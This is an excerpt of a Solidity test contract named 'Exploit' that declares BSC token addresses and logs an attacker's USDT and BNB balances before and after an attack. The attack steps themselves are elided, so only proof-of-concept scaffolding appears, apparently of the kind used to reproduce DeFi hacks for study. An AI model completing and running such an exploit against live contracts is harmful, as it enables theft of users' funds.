...
address constant TOKEN_USDT = address(
    0x55d398326f99059fF775485246999027B3197955
);
address constant TOKEN_BNB = address(
    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
);
address constant TOKEN_BUSD = address(
...
contract Exploit is Test {
    ...
    function bbb() public {
        ...
        console2.log(
            "before exploit : attacker USDT balance: ",
            IERC20(TOKEN_USDT).balanceOf(address(this))
        );
        console2.log(
            "before exploit : attacker BNB balance: ",
            IERC20(TOKEN_BNB).balanceOf(address(this))
        );
        ...
        console2.log(
            "after exploit : attacker USDT balance: ",
            IERC20(TOKEN_USDT).balanceOf(address(this))
        );
        console2.log(
            "after exploit : attacker BNB balance: ",
            IERC20(TOKEN_BNB).balanceOf(address(this))
        );
    }
